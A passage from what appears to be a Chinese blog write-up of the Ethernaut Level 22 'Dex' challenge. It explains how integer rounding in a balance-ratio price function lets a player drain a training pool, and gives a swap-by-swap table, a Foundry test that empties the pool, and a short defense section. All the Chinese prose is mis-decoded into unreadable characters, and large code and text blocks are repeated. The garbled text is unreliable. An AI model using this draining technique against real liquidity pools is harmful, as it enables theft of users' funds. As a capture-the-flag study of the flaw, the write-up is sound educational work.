class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²å¹¶è®¾ç½®ä»£å¸</span><br><span class=\"line\">        token1 = new SwappableToken(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableToken(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ·»åŠ æµåŠ¨æ€§</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token1), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token2), 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        // å‘é€åˆå§‹ä»£å¸ç»™ player</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æˆæƒ Dex åˆçº¦æ— é™é‡çš„ä»£å¸</span><br><span class=\"line\">        token1.approve(address(instance), type(uint256).max);</span><br><span class=\"line\">        token2.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ‰§è¡Œæ”»å‡»æµç¨‹</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 10 TKN1 -&gt; 10 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 20 TKN2 -&gt; 24 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 24 TKN1 -&gt; 30 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 30 TKN2 -&gt; 41 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 41 TKN1 -&gt; 65 TKN2</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æœ€ç»ˆä¸€å‡»</span><br><span class=\"line\">        instance.swap(address(token2), address(token1), 45);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ Dex ä¸­è‡³å°‘ä¸€ç§ä»£å¸å·²è¢«è€—å°½</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of one token&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // è¾…åŠ©å‡½æ•°ï¼Œç”¨äºäº¤æ¢æŒ‡å®šä»£å¸çš„å…¨éƒ¨ä½™é¢</span><br><span class=\"line\">    function swapAll(address tokenIn, address tokenOut) internal &#123;</span><br><span class=\"line\">        uint256 balance = IERC20(tokenIn).balanceOf(player);</span><br><span class=\"line\">        instance.swap(tokenIn, tokenOut, balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>æˆæƒ</strong>: æˆæƒ <code>Dex</code> åˆçº¦å¯ä»¥ä»ä½ çš„åœ°å€è½¬ç§» <code>Token1</code> å’Œ <code>Token2</code>ã€‚</li>\n<li><strong>åå¤äº¤æ¢</strong>: åœ¨ <code>Token1</code> å’Œ <code>Token2</code> ä¹‹é—´æ¥å›äº¤æ¢ä½ çš„å…¨éƒ¨ä½™é¢ã€‚</li>\n<li><strong>åˆ©ç”¨è¯¯å·®</strong>: æ¯æ¬¡äº¤æ¢éƒ½ä¼šå› ä¸ºæ•´æ•°é™¤æ³•çš„èˆå…¥è€Œäº§ç”Ÿå¾®å°çš„åˆ©æ¶¦ã€‚</li>\n<li><strong>ç´¯ç§¯ä¼˜åŠ¿</strong>: é‡å¤äº¤æ¢ï¼Œç›´åˆ°ä½ æ‹¥æœ‰çš„ä»£å¸æ•°é‡è¶³ä»¥ä¸€æ¬¡æ€§æ¢èµ°æ± ä¸­å‰©ä½™çš„æ‰€æœ‰å¦ä¸€ç§ä»£å¸ã€‚</li>\n<li><strong>æœ€ç»ˆä¸€å‡»</strong>: æ‰§è¡Œæœ€åä¸€æ¬¡äº¤æ¢ï¼Œæ¸…ç©ºæ± å­ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>é¿å…ä»·æ ¼æ“çºµ</strong>: ç®€å•çš„ <code>balanceOf(A) / balanceOf(B)</code> ä»·æ ¼å…¬å¼ææ˜“å—åˆ°æ“çºµã€‚ç°ä»£DEXï¼ˆå¦‚Uniswap V2ï¼‰ä½¿ç”¨ <code>x * y = k</code> çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼Œè¿™ä½¿å¾—æ“çºµä»·æ ¼çš„æˆæœ¬è¦é«˜å¾—å¤šã€‚</li>\n<li><strong>å¤„ç†èˆå…¥è¯¯å·®</strong>: åœ¨é‡‘èè®¡ç®—ä¸­ï¼Œå¿…é¡»ä»”ç»†å¤„ç†ç²¾åº¦é—®é¢˜ã€‚å¯ä»¥è€ƒè™‘ï¼š<ul>\n<li>å°†è®¡ç®—é¡ºåºè°ƒæ•´ä¸ºå…ˆä¹˜åé™¤ï¼Œä»¥å‡å°‘ç²¾åº¦æŸå¤±ã€‚</li>\n<li>ä½¿ç”¨æ›´é«˜ç²¾åº¦çš„æ•°å­¦åº“ï¼Œå¦‚ <code>SafeMath</code> æˆ–ä¸“é—¨çš„å®šç‚¹æ•°åº“ã€‚</li>\n</ul>\n</li>\n<li><strong>ä½¿ç”¨å»ä¸­å¿ƒåŒ–é¢„è¨€æœº</strong>: å¯¹äºéœ€è¦å¯é ä»·æ ¼çš„åº”ç”¨ï¼Œä¸åº”ä¾èµ–äºå•ä¸ªDEXæ± çš„ç¬æ—¶ä»·æ ¼ã€‚åº”ä½¿ç”¨æ›´ç¨³å¥çš„ä»·æ ¼æ¥æºï¼Œå¦‚ Chainlink æˆ– Uniswap V3 çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆTWAPï¼‰é¢„è¨€æœºã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>DEX (å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€)</strong>: ä¸€ç§åŸºäºæ™ºèƒ½åˆçº¦çš„äº¤æ˜“æ‰€ï¼Œå…è®¸ç”¨æˆ·åœ¨æ²¡æœ‰ä¸­å¿ƒåŒ–ä¸­ä»‹çš„æƒ…å†µä¸‹äº¤æ˜“åŠ å¯†èµ„äº§ã€‚</li>\n<li><strong>ä»·æ ¼é¢„è¨€æœº (Price Oracle)</strong>: ä¸ºæ™ºèƒ½åˆçº¦æä¾›é“¾ä¸‹æˆ–é“¾ä¸Šèµ„äº§ä»·æ ¼ä¿¡æ¯çš„æœåŠ¡ã€‚</li>\n<li><strong>æ•´æ•°é™¤æ³•</strong>: Solidityï¼ˆä»¥åŠè®¸å¤šå…¶ä»–ç¼–ç¨‹è¯­è¨€ï¼‰ä¸­æ•´æ•°é™¤æ³•å‘ä¸‹èˆå…¥çš„ç‰¹æ€§ï¼Œæ˜¯è®¸å¤šæ•°å­¦ç›¸å…³æ¼æ´çš„æ ¹æºã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åœ¨æ™ºèƒ½åˆçº¦ä¸­è¿›è¡Œé‡‘èè®¡ç®—æ—¶ï¼Œæ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®å¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ¼æ´ã€‚</li>\n<li>ç®€å•çš„ã€åŸºäºå³æ—¶æµåŠ¨æ€§çš„ä»·æ ¼å‘ç°æœºåˆ¶å¾ˆå®¹æ˜“è¢«æ“çºµã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„äº¤æ˜“ï¼Œåˆ©ç”¨å¹¶æ”¾å¤§æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ã€‚</li>\n<li>é€æ¸ç§¯ç´¯ä¼˜åŠ¿ï¼Œç›´åˆ°èƒ½å¤Ÿå®Œå…¨è€—å°½æµåŠ¨æ€§æ± ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä½¿ç”¨æ›´æˆç†Ÿå’ŒæŠ—æ“çºµçš„å®šä»·æ¨¡å‹ï¼ˆå¦‚æ’å®šä¹˜ç§¯æ¨¡å‹ï¼‰ã€‚</li>\n<li>åœ¨è¿›è¡Œæ•°å­¦è¿ç®—æ—¶ï¼Œå§‹ç»ˆæ³¨æ„è¿ç®—é¡ºåºå’Œç²¾åº¦æŸå¤±é—®é¢˜ã€‚</li>\n<li>å¯¹äºå…³é”®åº”ç”¨ï¼Œä¾èµ–äºå¥å£®çš„ä»·æ ¼é¢„è¨€æœºï¼Œè€Œä¸æ˜¯æ˜“å—æ”»å‡»çš„å³æ—¶ä»·æ ¼ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://uniswap.org/whitepaper.pdf\">Uniswap V2 Whitepaper</a></li>\n<li><a href=\"https://docs.chain.link/docs/get-the-latest-price/\">Chainlink Price Feeds</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-22-Dex-ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-22-Dex-ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\"></a>ğŸ¯ Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/22\">Ethernaut Level 22 - Dex</a><br><strong>æ”»å‡»ç±»å‹</strong>: ä»·æ ¼æ“çºµ &#x2F; æ•´æ•°èˆå…¥æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½ å’Œ <code>Dex</code> åˆçº¦æœ€åˆéƒ½æ‹¥æœ‰ <code>Token1</code> å’Œ <code>Token2</code>ã€‚ä½ çš„ç›®æ ‡æ˜¯è€—å°½ <code>Dex</code> åˆçº¦ä¸­ <code>Token1</code> æˆ– <code>Token2</code> çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚</p>\n<ul>\n<li><strong>åˆå§‹çŠ¶æ€</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg\" alt=\"Dex Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¿™ä¸ª <code>Dex</code> åˆçº¦æ˜¯ä¸€ä¸ªæç®€çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼Œå…¶æ ¸å¿ƒæ¼æ´åœ¨äºå®ƒçš„ä»·æ ¼è®¡ç®—å‡½æ•° <code>getSwapPrice()</code>ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class=\"line\">    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ªå‡½æ•°é€šè¿‡ä¸¤ç§ä»£å¸åœ¨æ± ä¸­ä½™é¢çš„æ¯”ä¾‹æ¥è®¡ç®—äº¤æ¢ä»·æ ¼ã€‚é—®é¢˜å‡ºåœ¨ Solidity çš„æ•´æ•°é™¤æ³•ä¸Šã€‚æ•´æ•°é™¤æ³•ä¼šå‘ä¸‹èˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°ï¼Œä»»ä½•å°æ•°éƒ¨åˆ†éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚ä¾‹å¦‚ï¼Œ<code>7 / 2</code> çš„ç»“æœæ˜¯ <code>3</code>ï¼Œè€Œä¸æ˜¯ <code>3.5</code>ã€‚</p>\n<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªèˆå…¥è¯¯å·®æ¥è·åˆ©ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„äº¤æ¢é¡ºåºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯æ¬¡äº¤æ¢ä¸­è·å¾—æ¯”é¢„æœŸâ€œå…¬å¹³â€ä»·æ ¼æ›´å¤šçš„ä»£å¸ï¼Œä»è€Œé€æ¸è€—å°½æ± ä¸­çš„èµ„é‡‘ã€‚</p>\n<h3 id=\"æ”»å‡»æµç¨‹\"><a href=\"#æ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹\"></a>æ”»å‡»æµç¨‹</h3><p>æˆ‘ä»¬çš„ç­–ç•¥æ˜¯é€šè¿‡åœ¨ä¸¤ç§ä»£å¸ä¹‹é—´åå¤äº¤æ¢æˆ‘ä»¬çš„å…¨éƒ¨ä½™é¢æ¥æ”¾å¤§è¿™ä¸ªèˆå…¥è¯¯å·®ã€‚</p>\n<ol>\n<li><p><strong>åˆå§‹çŠ¶æ€</strong>: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). ä»·æ ¼æ¯”ä¸º 1:1ã€‚</p>\n</li>\n<li><p><strong>ç¬¬ä¸€æ¬¡äº¤æ¢ (10 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (10 * 100) / 100 = 10</code></li>\n<li>Player: (0 TKN1, 20 TKN2)</li>\n<li>Dex: (110 TKN1, 90 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬äºŒæ¬¡äº¤æ¢ (20 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (20 * 110) / 90 = 24.44...</code> -&gt; <strong>èˆå…¥åä¸º 24</strong></li>\n<li>Player: (24 TKN1, 0 TKN2)</li>\n<li>Dex: (86 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬ä¸‰æ¬¡äº¤æ¢ (24 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (24 * 110) / 86 = 30.69...</code> -&gt; <strong>èˆå…¥åä¸º 30</strong></li>\n<li>Player: (0 TKN1, 30 TKN2)</li>\n<li>Dex: (110 TKN1, 80 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬å››æ¬¡äº¤æ¢ (30 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (30 * 110) / 80 = 41.25</code> -&gt; <strong>èˆå…¥åä¸º 41</strong></li>\n<li>Player: (41 TKN1, 0 TKN2)</li>\n<li>Dex: (69 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬äº”æ¬¡äº¤æ¢ (41 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (41 * 110) / 69 = 65.36...</code> -&gt; <strong>èˆå…¥åä¸º 65</strong></li>\n<li>Player: (0 TKN1, 65 TKN2)</li>\n<li>Dex: (110 TKN1, 45 TKN2)</li>\n</ul>\n</li>\n</ol>\n<p>ç°åœ¨ï¼Œæˆ‘ä»¬æ‰‹ä¸Šæœ‰65ä¸ªTKN2ï¼Œè€ŒDexæ± ä¸­åªå‰©ä¸‹110ä¸ªTKN1å’Œ45ä¸ªTKN2ã€‚æˆ‘ä»¬åªéœ€è¦ç”¨45ä¸ªTKN2å°±å¯ä»¥æ¢èµ°æ± é‡Œæ‰€æœ‰çš„110ä¸ªTKN1ã€‚</p>\n<ol start=\"7\">\n<li><strong>æœ€ç»ˆäº¤æ¢ (45 TKN2 -&gt; TKN1)</strong>:<ul>\n<li><code>amountOut = (45 * 110) / 45 = 110</code></li>\n<li>Player: (110 TKN1, 20 TKN2)</li>\n<li>Dex: (0 TKN1, 90 TKN2) -&gt; <strong>TKN1 è¢«è€—å°½ï¼</strong></li>\n</ul>\n</li>\n</ol>\n<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ï¼Œåœ¨æ¯æ¬¡äº¤æ˜“ä¸­éƒ½è·å¾—äº†å¾®å°çš„ä¼˜åŠ¿ï¼Œå¹¶æœ€ç»ˆå°†è¿™ç§ä¼˜åŠ¿ç´¯ç§¯åˆ°è¶³ä»¥æ¸…ç©ºæ•´ä¸ªæ± å­ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„äº¤æ¢æµç¨‹ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/22_Dex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTest is Test &#123;</span><br><span class=\"line\">    Dex instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableToken token1;</span><br><span class=\"line\">    SwappableToken token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Dex();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²å¹¶è®¾ç½®ä»£å¸</span><br><span class=\"line\">        token1 = new SwappableToken(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableToken(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ·»åŠ æµåŠ¨æ€§</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token1), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token2), 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        // å‘é€åˆå§‹ä»£å¸ç»™ player</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æˆæƒ Dex åˆçº¦æ— é™é‡çš„ä»£å¸</span><br><span class=\"line\">        token1.approve(address(instance), type(uint256).max);</span><br><span class=\"line\">        token2.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ‰§è¡Œæ”»å‡»æµç¨‹</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 10 TKN1 -&gt; 10 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 20 TKN2 -&gt; 24 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 24 TKN1 -&gt; 30 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 30 TKN2 -&gt; 41 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 41 TKN1 -&gt; 65 TKN2</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æœ€ç»ˆä¸€å‡»</span><br><span class=\"line\">        instance.swap(address(token2), address(token1), 45);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ Dex ä¸­è‡³å°‘ä¸€ç§ä»£å¸å·²è¢«è€—å°½</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of one token&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // è¾…åŠ©å‡½æ•°ï¼Œç”¨äºäº¤æ¢æŒ‡å®šä»£å¸çš„å…¨éƒ¨ä½™é¢</span><br><span class=\"line\">    function swapAll(address tokenIn, address tokenOut) internal &#123;</span><br><span class=\"line\">        uint256 balance = IERC20(tokenIn).balanceOf(player);</span><br><span class=\"line\">        instance.swap(tokenIn, tokenOut, balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>æˆæƒ</strong>: æˆæƒ <code>Dex</code> åˆçº¦å¯ä»¥ä»ä½ çš„åœ°å€è½¬ç§» <code>Token1</code> å’Œ <code>Token2</code>ã€‚</li>\n<li><strong>åå¤äº¤æ¢</strong>: åœ¨ <code>Token1</code> å’Œ <code>Token2</code> ä¹‹é—´æ¥å›äº¤æ¢ä½ çš„å…¨éƒ¨ä½™é¢ã€‚</li>\n<li><strong>åˆ©ç”¨è¯¯å·®</strong>: æ¯æ¬¡äº¤æ¢éƒ½ä¼šå› ä¸ºæ•´æ•°é™¤æ³•çš„èˆå…¥è€Œäº§ç”Ÿå¾®å°çš„åˆ©æ¶¦ã€‚</li>\n<li><strong>ç´¯ç§¯ä¼˜åŠ¿</strong>: é‡å¤äº¤æ¢ï¼Œç›´åˆ°ä½ æ‹¥æœ‰çš„ä»£å¸æ•°é‡è¶³ä»¥ä¸€æ¬¡æ€§æ¢èµ°æ± ä¸­å‰©ä½™çš„æ‰€æœ‰å¦ä¸€ç§ä»£å¸ã€‚</li>\n<li><strong>æœ€ç»ˆä¸€å‡»</strong>: æ‰§è¡Œæœ€åä¸€æ¬¡äº¤æ¢ï¼Œæ¸…ç©ºæ± å­ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>é¿å…ä»·æ ¼æ“çºµ</strong>: ç®€å•çš„ <code>balanceOf(A) / balanceOf(B)</code> ä»·æ ¼å…¬å¼ææ˜“å—åˆ°æ“çºµã€‚ç°ä»£DEXï¼ˆå¦‚Uniswap V2ï¼‰ä½¿ç”¨ <code>x * y = k</code> çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼Œè¿™ä½¿å¾—æ“çºµä»·æ ¼çš„æˆæœ¬è¦é«˜å¾—å¤šã€‚</li>\n<li><strong>å¤„ç†èˆå…¥è¯¯å·®</strong>: åœ¨é‡‘èè®¡ç®—ä¸­ï¼Œå¿…é¡»ä»”ç»†å¤„ç†ç²¾åº¦é—®é¢˜ã€‚å¯ä»¥è€ƒè™‘ï¼š<ul>\n<li>å°†è®¡ç®—é¡ºåºè°ƒæ•´ä¸ºå…ˆä¹˜åé™¤ï¼Œä»¥å‡å°‘ç²¾åº¦æŸå¤±ã€‚</li>\n<li>ä½¿ç”¨æ›´é«˜ç²¾åº¦çš„æ•°å­¦åº“ï¼Œå¦‚ <code>SafeMath</code> æˆ–ä¸“é—¨çš„å®šç‚¹æ•°åº“ã€‚</li>\n</ul>\n</li>\n<li><strong>ä½¿ç”¨å»ä¸­å¿ƒåŒ–é¢„è¨€æœº</strong>: å¯¹äºéœ€è¦å¯é ä»·æ ¼çš„åº”ç”¨ï¼Œä¸åº”ä¾èµ–äºå•ä¸ªDEXæ± çš„ç¬æ—¶ä»·æ ¼ã€‚åº”ä½¿ç”¨æ›´ç¨³å¥çš„ä»·æ ¼æ¥æºï¼Œå¦‚ Chainlink æˆ– Uniswap V3 çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆTWAPï¼‰é¢„è¨€æœºã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>DEX (å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€)</strong>: 